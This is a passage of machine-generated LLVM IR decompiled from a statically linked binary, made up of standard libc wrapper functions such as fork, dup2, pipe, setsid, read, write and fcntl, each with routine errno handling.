  %v2_13e8c = add i32 %v2_13e80, %v2_13e84
  %v3_13e8c = icmp ult i32 %v2_13e8c, %v2_13e80
  br i1 %v3_13e8c, label %bb, label %bb7

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v4_13e94 = mul i32 %v2_13e8c, 65536
  %v5_13e94 = add i32 %v4_13e94, %v2_13e7c
  ret i32 %v5_13e94

; uselistorder directives
  uselistorder i32 %v2_13e80, { 1, 0 }
  uselistorder i32 %v6_13e74, { 1, 0 }
  uselistorder i32 %v3_13e70, { 1, 0 }
  uselistorder i32 %v3_13e6c, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @function_13ea8(i32 %arg1) local_unnamed_addr {
dec_label_pc_13ea8:
  ret i32 %arg1
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_13eb0 = call i32 @vfork()
  store i32 %v0_13eb0, i32* @r0, align 4
  %v2_13eb4 = icmp ugt i32 %v0_13eb0, -4097
  br i1 %v2_13eb4, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_13ec8, %entry
  %merge = phi i32 [ %v0_13eb0, %entry ], [ %v0_13ec8, %dec_label_pc_13ec8 ]
  ret i32 %merge

bb1:                                              ; preds = %entry
  %v4_13ec0 = icmp eq i32 %v0_13eb0, -38
  br i1 %v4_13ec0, label %dec_label_pc_13ec8, label %bb2

dec_label_pc_13ec8:                               ; preds = %bb1
  %v0_13ec8 = call i32 @fork()
  store i32 %v0_13ec8, i32* @r0, align 4
  %v2_13ecc = icmp ugt i32 %v0_13ec8, -4097
  br i1 %v2_13ecc, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_13ec8
  %v0_13ed4 = call i32 @__syscall_error()
  ret i32 %v0_13ed4

; uselistorder directives
  uselistorder i32 %v0_13ec8, { 1, 2, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @dup2() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13ee0 = load i32, i32* @r4, align 4
  store i32 %v3_13ee0, i32* %stack_var_-8, align 4
  %v0_13ee4 = call i32 @dup2()
  store i32 %v0_13ee4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13ee4, -4095
  br i1 %tmp, label %bb, label %bb3

bb:                                               ; preds = %entry
  %v6_13ef4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_13ef4, i32* @r4, align 4
  ret i32 %v0_13ee4

bb3:                                              ; preds = %entry
  %v0_13ef8 = call i32 @__GI___errno_location()
  %v0_13efc = load i32, i32* %r4.global-to-local, align 4
  %v1_13efc = sub i32 0, %v0_13efc
  %v2_13f00 = inttoptr i32 %v0_13ef8 to i32*
  store i32 %v1_13efc, i32* %v2_13f00, align 4
  %v2_13f08 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13f08, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_13ee4, { 1, 0, 2 }
  uselistorder i32 ()* @dup2, { 2, 1, 0 }
}

define i32 @__GI_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_13f0c = load i32, i32* @r2, align 4
  %v9_13f0c = load i32, i32* @r3, align 4
  store i32 %v9_13f0c, i32* %stack_var_-4, align 4
  %v1_13f1c = and i32 %arg2, 64
  %v2_13f1c = icmp eq i32 %v1_13f1c, 0
  br i1 %v2_13f1c, label %.thread.thread, label %bb

.thread.thread:                                   ; preds = %entry
  br label %bb20

bb:                                               ; preds = %entry
  %v3_13f24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_13f24, i32* @r3, align 4
  %phitmp = urem i32 %v6_13f0c, 65536
  br label %bb20

bb20:                                             ; preds = %.thread.thread, %bb
  %v0_13f30 = phi i32 [ 0, %.thread.thread ], [ %phitmp, %bb ]
  store i32 %v0_13f30, i32* @r2, align 4
  %v4_13f34 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  store i32 %v4_13f34, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_13f34, -4095
  br i1 %tmp, label %dec_label_pc_13f54, label %dec_label_pc_13f44

dec_label_pc_13f44:                               ; preds = %bb20
  %v0_13f44 = call i32 @__GI___errno_location()
  %v0_13f48 = load i32, i32* %r4.global-to-local, align 4
  %v1_13f48 = sub i32 0, %v0_13f48
  store i32 %v1_13f48, i32* @r3, align 4
  %v2_13f4c = inttoptr i32 %v0_13f44 to i32*
  store i32 %v1_13f48, i32* %v2_13f4c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13f54

dec_label_pc_13f54:                               ; preds = %bb20, %dec_label_pc_13f44
  %v0_13f54 = phi i32 [ %v4_13f34, %bb20 ], [ -1, %dec_label_pc_13f44 ]
  ret i32 %v0_13f54

; uselistorder directives
  uselistorder i32 %v4_13f34, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_13f54, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13f68 = load i32, i32* @r4, align 4
  store i32 %v3_13f68, i32* %stack_var_-8, align 4
  %v1_13f6c = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_13f6c = call i32 @pipe([2 x i32] %v1_13f6c)
  store i32 %v2_13f6c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_13f6c, -4095
  br i1 %tmp, label %bb, label %bb3

bb:                                               ; preds = %entry
  %v6_13f7c = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_13f7c, i32* @r4, align 4
  ret i32 %v2_13f6c

bb3:                                              ; preds = %entry
  %v0_13f80 = call i32 @__GI___errno_location()
  %v0_13f84 = load i32, i32* %r4.global-to-local, align 4
  %v1_13f84 = sub i32 0, %v0_13f84
  %v2_13f88 = inttoptr i32 %v0_13f80 to i32*
  store i32 %v1_13f84, i32* %v2_13f88, align 4
  %v2_13f90 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13f90, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_13f6c, { 1, 0, 2 }
}

define i32 @__GI_getpid() local_unnamed_addr {
entry:
  %v0_13f94 = call i32 @getpid()
  ret i32 %v0_13f94
}

define i32 @__GI_time(i32* %timer) local_unnamed_addr {
entry:
  %v2_13f9c = call i32 @time(i32* %timer)
  ret i32 %v2_13f9c

; uselistorder directives
  uselistorder i32 (i32*)* @time, { 28, 19, 5, 4, 3, 2, 27, 24, 18, 0, 17, 15, 1, 26, 22, 10, 11, 12, 14, 13, 21, 9, 16, 20, 7, 8, 6, 25, 23 }
}

define i32 @prctl() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13fa4 = load i32, i32* @r4, align 4
  store i32 %v3_13fa4, i32* %stack_var_-8, align 4
  %v0_13fac = call i32 @prctl()
  store i32 %v0_13fac, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13fac, -4095
  br i1 %tmp, label %bb, label %bb3

bb:                                               ; preds = %entry
  %v6_13fbc = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_13fbc, i32* %r4.global-to-local, align 4
  ret i32 %v0_13fac

bb3:                                              ; preds = %entry
  %v0_13fc0 = call i32 @__GI___errno_location()
  %v0_13fc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_13fc4 = sub i32 0, %v0_13fc4
  %v2_13fc8 = inttoptr i32 %v0_13fc0 to i32*
  store i32 %v1_13fc4, i32* %v2_13fc8, align 4
  %v2_13fd0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13fd0, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_13fac, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 ()* @prctl, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_13fd8 = load i32, i32* @r0, align 4
  ret i32 %v1_13fd8
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13fdc = load i32, i32* @r4, align 4
  store i32 %v3_13fdc, i32* %stack_var_-8, align 4
  %v0_13fe0 = call i32 @fork()
  store i32 %v0_13fe0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13fe0, -4095
  br i1 %tmp, label %bb, label %bb3

bb:                                               ; preds = %entry
  %v6_13ff0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_13ff0, i32* @r4, align 4
  ret i32 %v0_13fe0

bb3:                                              ; preds = %entry
  %v0_13ff4 = call i32 @__GI___errno_location()
  %v0_13ff8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13ff8 = sub i32 0, %v0_13ff8
  %v2_13ffc = inttoptr i32 %v0_13ff4 to i32*
  store i32 %v1_13ff8, i32* %v2_13ffc, align 4
  %v2_14004 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14004, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_13fe0, { 1, 0, 2 }
  uselistorder i32 ()* @fork, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_1400c = call i32 @wait4()
  ret i32 %v0_1400c
}

define i32 @access() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14010 = load i32, i32* @r4, align 4
  store i32 %v3_14010, i32* %stack_var_-8, align 4
  %v0_14014 = call i32 @access()
  store i32 %v0_14014, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14014, -4095
  br i1 %tmp, label %bb, label %bb3

bb:                                               ; preds = %entry
  %v6_14024 = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_14024, i32* @r4, align 4
  ret i32 %v0_14014

bb3:                                              ; preds = %entry
  %v0_14028 = call i32 @__GI___errno_location()
  %v0_1402c = load i32, i32* %r4.global-to-local, align 4
  %v1_1402c = sub i32 0, %v0_1402c
  %v2_14030 = inttoptr i32 %v0_14028 to i32*
  store i32 %v1_1402c, i32* %v2_14030, align 4
  %v2_14038 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14038, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_14014, { 1, 0, 2 }
  uselistorder i32 ()* @access, { 2, 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1403c = load i32, i32* @r4, align 4
  store i32 %v3_1403c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14064, label %dec_label_pc_14054

dec_label_pc_14054:                               ; preds = %entry
  %v0_14054 = call i32 @__GI___errno_location()
  %v0_14058 = load i32, i32* %r4.global-to-local, align 4
  %v1_14058 = sub i32 0, %v0_14058
  %v2_1405c = inttoptr i32 %v0_14054 to i32*
  store i32 %v1_14058, i32* %v2_1405c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14068.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14064

dec_label_pc_14064:                               ; preds = %entry, %dec_label_pc_14054
  %v2_14068 = phi i32 [ %v3_1403c, %entry ], [ %v2_14068.pre, %dec_label_pc_14054 ]
  %v0_14064 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_14054 ]
  store i32 %v2_14068, i32* @r4, align 4
  ret i32 %v0_14064

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14064, { 1, 0 }
}

define i32 @chdir() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1406c = load i32, i32* @r4, align 4
  store i32 %v3_1406c, i32* %stack_var_-8, align 4
  %v0_14070 = call i32 @chdir()
  store i32 %v0_14070, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14070, -4095
  br i1 %tmp, label %dec_label_pc_14090, label %dec_label_pc_14080

dec_label_pc_14080:                               ; preds = %entry
  %v0_14080 = call i32 @__GI___errno_location()
  %v0_14084 = load i32, i32* %r4.global-to-local, align 4
  %v1_14084 = sub i32 0, %v0_14084
  %v2_14088 = inttoptr i32 %v0_14080 to i32*
  store i32 %v1_14084, i32* %v2_14088, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14090

dec_label_pc_14090:                               ; preds = %entry, %dec_label_pc_14080
  %v0_14090 = phi i32 [ %v0_14070, %entry ], [ -1, %dec_label_pc_14080 ]
  %v2_14094 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14094, i32* @r4, align 4
  ret i32 %v0_14090

; uselistorder directives
  uselistorder i32 %v0_14070, { 1, 0, 2 }
  uselistorder i32 ()* @chdir, { 1, 0 }
  uselistorder label %dec_label_pc_14090, { 1, 0 }
}

define i32 @__GI_read(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14098 = load i32, i32* @r4, align 4
  store i32 %v3_14098, i32* %stack_var_-8, align 4
  %v1_1409c = load i32, i32* @r1, align 4
  %v2_1409c = inttoptr i32 %v1_1409c to i32*
  %v3_1409c = load i32, i32* @r2, align 4
  %v4_1409c = call i32 @read(i32 %arg1, i32* %v2_1409c, i32 %v3_1409c)
  store i32 %v4_1409c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_1409c, -4095
  br i1 %tmp, label %bb, label %bb3

bb:                                               ; preds = %entry
  %v6_140ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_140ac, i32* @r4, align 4
  ret i32 %v4_1409c

bb3:                                              ; preds = %entry
  %v0_140b0 = call i32 @__GI___errno_location()
  %v0_140b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_140b4 = sub i32 0, %v0_140b4
  %v2_140b8 = inttoptr i32 %v0_140b0 to i32*
  store i32 %v1_140b4, i32* %v2_140b8, align 4
  %v2_140c0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_140c0, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v4_1409c, { 1, 0, 2 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_140c8 = ptrtoint i32* %stack_var_-12 to i32
  %v2_140d4 = call i32 @getrlimit(i32 7, i32 %v2_140c8)
  %v1_140d8 = icmp slt i32 %v2_140d4, 0
  %v5_140dc = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v1_140d8, i32 256, i32 %v5_140dc
  ret i32 %storemerge
}

define i32 @kill() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_140ec = load i32, i32* @r4, align 4
  store i32 %v3_140ec, i32* %stack_var_-8, align 4
  %v0_140f0 = call i32 @kill()
  store i32 %v0_140f0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_140f0, -4095
  br i1 %tmp, label %dec_label_pc_14110, label %dec_label_pc_14100

dec_label_pc_14100:                               ; preds = %entry
  %v0_14100 = call i32 @__GI___errno_location()
  %v0_14104 = load i32, i32* %r4.global-to-local, align 4
  %v1_14104 = sub i32 0, %v0_14104
  %v2_14108 = inttoptr i32 %v0_14100 to i32*
  store i32 %v1_14104, i32* %v2_14108, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14110

dec_label_pc_14110:                               ; preds = %entry, %dec_label_pc_14100
  %v0_14110 = phi i32 [ %v0_140f0, %entry ], [ -1, %dec_label_pc_14100 ]
  %v2_14114 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14114, i32* @r4, align 4
  ret i32 %v0_14110

; uselistorder directives
  uselistorder i32 %v0_140f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14110, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_14118 = load i32, i32* @r3, align 4
  store i32 %v9_14118, i32* %stack_var_-4, align 4
  %v1_14128 = add i32 %arg2, -12
  %v2_14130 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_14130, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_14128, 2
  %v0_14148 = load i32, i32* %r0.global-to-local, align 4
  br i1 %tmp, label %dec_label_pc_14148, label %dec_label_pc_1414c

dec_label_pc_14148:                               ; preds = %entry
  %v2_14148 = call i32 (i32, i32, ...) @fcntl(i32 %v0_14148, i32 %arg2)
  store i32 %v2_14148, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1414c

dec_label_pc_1414c:                               ; preds = %entry, %dec_label_pc_14148
  %v0_14150 = phi i32 [ %v2_14148, %dec_label_pc_14148 ], [ %v0_14148, %entry ]
  store i32 %v0_14150, i32* %r4.global-to-local, align 4
  %tmp9 = icmp ult i32 %v0_14150, -4095
  br i1 %tmp9, label %dec_label_pc_1416c, label %dec_label_pc_1415c

dec_label_pc_1415c:                               ; preds = %dec_label_pc_1414c
  %v0_1415c = call i32 @__GI___errno_location()
  %v0_14160 = load i32, i32* %r4.global-to-local, align 4
  %v1_14160 = sub i32 0, %v0_14160
  store i32 %v1_14160, i32* @r3, align 4
  %v2_14164 = inttoptr i32 %v0_1415c to i32*
  store i32 %v1_14160, i32* %v2_14164, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1416c

dec_label_pc_1416c:                               ; preds = %dec_label_pc_1414c, %dec_label_pc_1415c
  %v1_14178 = phi i32 [ %v0_14150, %dec_label_pc_1414c ], [ -1, %dec_label_pc_1415c ]
  ret i32 %v1_14178

; uselistorder directives
  uselistorder i32 %v0_14150, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1416c, { 1, 0 }
  uselistorder label %dec_label_pc_1414c, { 1, 0 }
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_1418c = add i32 %arg2, -12
  %tmp = icmp ugt i32 %v1_1418c, 2
  %v0_141ac = load i32, i32* %r0.global-to-local, align 4
  br i1 %tmp, label %dec_label_pc_141ac, label %dec_label_pc_141b0

dec_label_pc_141ac:                               ; preds = %entry
  %v2_141ac = call i32 (i32, i32, ...) @fcntl(i32 %v0_141ac, i32 %arg2)
  store i32 %v2_141ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_141b0

dec_label_pc_141b0:                               ; preds = %entry, %dec_label_pc_141ac
  %v0_141b4 = phi i32 [ %v2_141ac, %dec_label_pc_141ac ], [ %v0_141ac, %entry ]
  store i32 %v0_141b4, i32* %r4.global-to-local, align 4
  %tmp9 = icmp ult i32 %v0_141b4, -4095
  br i1 %tmp9, label %dec_label_pc_141d0, label %dec_label_pc_141c0

dec_label_pc_141c0:                               ; preds = %dec_label_pc_141b0
  %v0_141c0 = call i32 @__GI___errno_location()
  %v0_141c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_141c4 = sub i32 0, %v0_141c4
  %v2_141c8 = inttoptr i32 %v0_141c0 to i32*
  store i32 %v1_141c4, i32* %v2_141c8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_141d0

dec_label_pc_141d0:                               ; preds = %dec_label_pc_141b0, %dec_label_pc_141c0
  %v1_141dc = phi i32 [ %v0_141b4, %dec_label_pc_141b0 ], [ -1, %dec_label_pc_141c0 ]
  ret i32 %v1_141dc

; uselistorder directives
  uselistorder i32 %v0_141b4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_141d0, { 1, 0 }
  uselistorder label %dec_label_pc_141b0, { 1, 0 }
}

define i32 @__GI_write(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_141e0 = load i32, i32* @r4, align 4
  store i32 %v3_141e0, i32* %stack_var_-8, align 4
  %v3_141e4 = load i32, i32* @r2, align 4
  %v4_141e4 = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_141e4)
  store i32 %v4_141e4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_141e4, -4095
  br i1 %tmp, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v6_141f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_141f4, i32* @r4, align 4
  ret i32 %v4_141e4

bb4:                                              ; preds = %entry
  %v0_141f8 = call i32 @__GI___errno_location()
  %v0_141fc = load i32, i32* %r4.global-to-local, align 4
  %v1_141fc = sub i32 0, %v0_141fc
  %v2_14200 = inttoptr i32 %v0_141f8 to i32*
  store i32 %v1_141fc, i32* %v2_14200, align 4
  %v2_14208 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14208, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v4_141e4, { 1, 0, 2 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1420c = load i32, i32* @r4, align 4
  store i32 %v3_1420c, i32* %stack_var_-8, align 4
  %v0_14210 = call i32 @setsid()
  store i32 %v0_14210, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14210, -4095
  br i1 %tmp, label %bb, label %bb3

bb:                                               ; preds = %entry
  %v6_14220 = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_14220, i32* @r4, align 4
  ret i32 %v0_14210

bb3:                                              ; preds = %entry
  %v0_14224 = call i32 @__GI___errno_location()
  %v0_14228 = load i32, i32* %r4.global-to-local, align 4
  %v1_14228 = sub i32 0, %v0_14228
  %v2_1422c = inttoptr i32 %v0_14224 to i32*
  store i32 %v1_14228, i32* %v2_1422c, align 4
  %v2_14234 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14234, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_14210, { 1, 0, 2 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_14254 = load i32, i32* @r0, align 4
  %v3_14254 = call i32 @ioctl(i32 %v0_14254, i32 %arg1, i32 %arg2)
  store i32 %v3_14254, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_14254, -4095
  br i1 %tmp, label %dec_label_pc_14274, label %dec_label_pc_14264

dec_label_pc_14264:                               ; preds = %entry
  %v0_14264 = call i32 @__GI___errno_location()
  %v0_14268 = load i32, i32* %r4.global-to-local, align 4
  %v1_14268 = sub i32 0, %v0_14268
  %v2_1426c = inttoptr i32 %v0_14264 to i32*
  store i32 %v1_14268, i32* %v2_1426c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14274

dec_label_pc_14274:                               ; preds = %entry, %dec_label_pc_14264
  %v0_14274 = phi i32 [ %v3_14254, %entry ], [ -1, %dec_label_pc_14264 ]
  ret i32 %v0_14274

; uselistorder directives
  uselistorder i32 %v3_14254, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14274, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-8 = alloca i32, align 4
  %v3_142b0 = load i32, i32* @r4, align 4
  store i32 %v3_142b0, i32* %stack_var_-8, align 4
  %v7_142b8 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_142b8, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v7_142b8, -4095
  br i1 %tmp6, label %dec_label_pc_142d8, label %dec_label_pc_142c8

dec_label_pc_142c8:                               ; preds = %entry
  %v0_142c8 = call i32 @__GI___errno_location()
  %v0_142cc = load i32, i32* %r4.global-to-local, align 4
  %v1_142cc = sub i32 0, %v0_142cc
  %v2_142d0 = inttoptr i32 %v0_142c8 to i32*
  store i32 %v1_142cc, i32* %v2_142d0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_142d8

dec_label_pc_142d8:                               ; preds = %entry, %dec_label_pc_142c8
  %v0_142d8 = phi i32 [ %v7_142b8, %entry ], [ -1, %dec_label_pc_142c8 ]
  %v2_142dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_142dc, i32* @r4, align 4
  ret i32 %v0_142d8

; uselistorder directives
  uselistorder i32 %v7_142b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_142d8, { 1, 0 }
}

define i32 @__GI_close(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_142e0 = load i32, i32* @r4, align 4
  store i32 %v3_142e0, i32* %stack_var_-8, align 4
  %v1_142e4 = call i32 @close(i32 %arg1)
  store i32 %v1_142e4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_142e4, -4095
  br i1 %tmp, label %bb, label %bb3

bb:                                               ; preds = %entry
  %v6_142f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_142f4, i32* @r4, align 4
  ret i32 %v1_142e4

bb3:                                              ; preds = %entry
  %v0_142f8 = call i32 @__GI___errno_location()
  %v0_142fc = load i32, i32* %r4.global-to-local, align 4
  %v1_142fc = sub i32 0, %v0_142fc
  %v2_14300 = inttoptr i32 %v0_142f8 to i32*
  store i32 %v1_142fc, i32* %v2_14300, align 4
  %v2_14308 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14308, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_142e4, { 1, 0, 2 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v2_14310 = load i32, i32* @global_var_2e1e4, align 4
  %v2_14314 = mul i32 %arg1, 2
  %v2_14318 = add i32 %v2_14310, %v2_14314
  %v1_1431c = add i32 %v2_14318, 1
  %v2_1431c = inttoptr i32 %v1_1431c to i8*
  %v3_1431c = load i8, i8* %v2_1431c, align 1
  %v4_1431c = zext i8 %v3_1431c to i32
  %v1_14320 = and i32 %v4_1431c, 32
  ret i32 %v1_14320
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1432c = add i32 %arg1, 128
  %v2_14330 = icmp ugt i32 %v1_1432c, 383
  br i1 %v2_14330, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_1433c = load i32, i32* @global_var_2e1ec, align 4
  %v2_14340 = mul i32 %arg1, 2
  %v2_14344 = add i32 %v2_1433c, %v2_14340
  %v3_14344 = inttoptr i32 %v2_14344 to i8*
  %v4_14344 = load i8, i8* %v3_14344, align 1
  %v6_14344 = zext i8 %v4_14344 to i32
  %v1_1434c = add i32 %v2_14344, 1
  %v2_1434c = inttoptr i32 %v1_1434c to i8*
  %v3_1434c = load i8, i8* %v2_1434c, align 1
  %v4_1434c = zext i8 %v3_1434c to i32
  %v3_14350 = mul nuw i32 %v6_14344, 16777216
  %v4_14354 = sdiv i32 %v3_14350, 65536
  %v5_14354 = or i32 %v4_1434c, %v4_14354
  ret i32 %v5_14354
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_34688.1316 to i32)
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-4, align 4
  %v2_143b4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_143b4, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_143c4 = call i32 @__GI_vsnprintf()
  ret i32 %v0_143c4

; uselistorder directives
